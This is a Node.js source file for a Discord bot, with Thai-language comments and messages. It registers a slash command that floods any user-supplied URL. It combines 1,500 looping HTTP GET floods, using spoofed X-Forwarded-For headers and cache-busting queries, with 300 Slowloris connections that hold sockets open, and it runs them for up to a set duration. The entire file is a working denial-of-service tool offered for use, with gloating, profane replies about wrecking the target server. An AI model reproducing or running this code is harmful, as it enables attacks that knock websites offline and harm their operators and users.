/**
 * ============================================================================
 * JEFF FUJI - ULTIMATE ANNIHILATION ENGINE v14 (ALL-IN-ONE FLOOD)
 * Developed under JARVIS x ARI Protocol
 * ============================================================================
 */

const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const http = require('http');
const https = require('https');
const dgram = require('dgram');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

let isAttacking = false;
let attackTimers = [];

const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 200000, maxFreeSockets: 100000 });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 200000, maxFreeSockets: 100000, rejectUnauthorized: false });

client.once('ready', async () => {
    console.log(`[+] Bot logged in as ${client.user.tag}`);

    const commands = [
        new SlashCommandBuilder()
            .setName('ultimate-annihilate')
            .setDescription('ระดมยิงถล่มทุกรูปแบบพร้อมกันในคำสั่งเดียว (Multi-Vector + Slowloris)')
            .addStringOption(option => 
                option.setName('target')
                    .setDescription('URL เป้าหมาย (เช่น https://bewergame.com)')
                    .setRequired(true))
            .addIntegerOption(option => 
                option.setName('duration')
                    .setDescription('ระยะเวลาเป็นวินาที (สูงสุด 300)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('stop')
            .setDescription('หยุดการกระทำทั้งหมดทันที')
    ].map(command => command.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        console.log('[+] Started refreshing application (/) commands.');
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('[+] Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'ultimate-annihilate') {
        const target = interaction.options.getString('target');
        const duration = interaction.options.getInteger('duration');

        if (isAttacking) {
            return interaction.reply({ content: '⚠️ กำลังมียุทธการอื่นทำงานอยู่ ใช้ /stop ก่อนไอ้สัส!', ephemeral: true });
        }

        isAttacking = true;
        const endTime = Date.now() + (duration * 1000);

        try {
            const parsedUrl = new URL(target);
            const requester = parsedUrl.protocol === 'https:' ? https : http;
            const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;

            await interaction.reply(`💀🔥 **[ULTIMATE ANNIHILATION ACTIVATED]** เริ่มระดมยิงคอมโบเซ็ตมหากาฬ (Multi-Vector + Slowloris) ใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);

            // 1. 🚀 โหมด Multi-Vector Swarm Flood (ยิงกระแทกความเร็วสูง)
            const fireMultiVector = () => {
                if (!isAttacking || Date.now() >= endTime) return;

                const options = {
                    hostname: parsedUrl.hostname,
                    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                    path: parsedUrl.pathname + parsedUrl.search + `?annihilate=${Math.random().toString(36).substring(7)}`,
                    method: 'GET',
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) UltimateEngine/4.0',
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive',
                        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
                    },
                    agent: currentAgent
                };

                const req = requester.request(options, (res) => {
                    res.on('data', () => {});
                    res.on('end', () => { if (isAttacking) setImmediate(fireMultiVector); });
                });

                req.on('error', () => { if (isAttacking) setImmediate(fireMultiVector); });
                req.end();
            };

            // 2. 🐌 โหมด Slowloris (ตรึง Socket สูบทรัพยากร)
            const fireSlowloris = () => {
                if (!isAttacking || Date.now() >= endTime) return;

                const options = {
                    hostname: parsedUrl.hostname,
                    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                    path: parsedUrl.pathname,
                    method: 'POST',
                    headers: {
                        'User-Agent': 'Mozilla/5.0 SlowlorisEngine/2.0',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Connection': 'keep-alive'
                    }
                };

                const req = requester.request(options, (res) => {
                    res.on('data', () => {});
                });

                req.on('error', () => {
                    if (isAttacking) setImmediate(fireSlowloris);
                });

                let slowTimer = setInterval(() => {
                    if (!isAttacking || Date.now() >= endTime) {
                        clearInterval(slowTimer);
                        req.destroy();
                        return;
                    }
                    try {
                        req.write(`X-Annihilate: ${Math.random()}\r\n`);
                    } catch (e) {
                        clearInterval(slowTimer);
                        req.destroy();
                        if (isAttacking) setImmediate(fireSlowloris);
                    }
                }, 4000);
            };

            // สตาร์ทกองทัพพร้อมกันทั้งสองระบบในคำสั่งเดียว!
            for (let i = 0; i < 1500; i++) {
                fireMultiVector();
            }
            for (let i = 0; i < 300; i++) {
                fireSlowloris();
            }

        } catch (err) {
            isAttacking = false;
            return interaction.reply({ content: `❌ URL ผิดรูปแบบ: ${err.message}`, ephemeral: true });
        }

        const timer = setTimeout(() => {
            isAttacking = false;
            interaction.followUp(`✅ ภารกิจทำลายล้าง **${target}** เสร็จสิ้นตามเวลาที่กำหนด! เซิร์ฟเวอร์เป้าหมายน่าจะแหลกสลายไม่เหลือซากแล้ว`).catch(() => {});
        }, duration * 1000);

        attackTimers.push(timer);

    } else if (commandName === 'stop') {
        if (!isAttacking) {
            return interaction.reply({ content: '💤 ไม่มีอะไรกำลังทำงานอยู่ มึงจะให้หยุดอะไรไอ้สัส', ephemeral: true });
        }

        isAttacking = false;
        attackTimers.forEach(t => clearTimeout(t));
        attackTimers = [];

        await interaction.reply('🛑 สั่งหยุดการทำงานทั้งหมดเรียบร้อย!');
    }
});

client.login(TOKEN);
